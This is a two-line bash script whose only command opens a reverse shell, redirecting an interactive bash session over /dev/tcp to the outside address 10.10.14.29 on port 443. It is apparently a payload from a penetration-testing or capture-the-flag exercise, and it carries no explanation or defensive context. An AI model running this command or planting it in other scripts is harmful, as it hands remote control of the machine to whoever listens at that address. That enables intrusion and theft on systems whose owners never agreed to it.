#!/bin/bash

bash >& /dev/tcp/10.10.14.29/443 0>&1
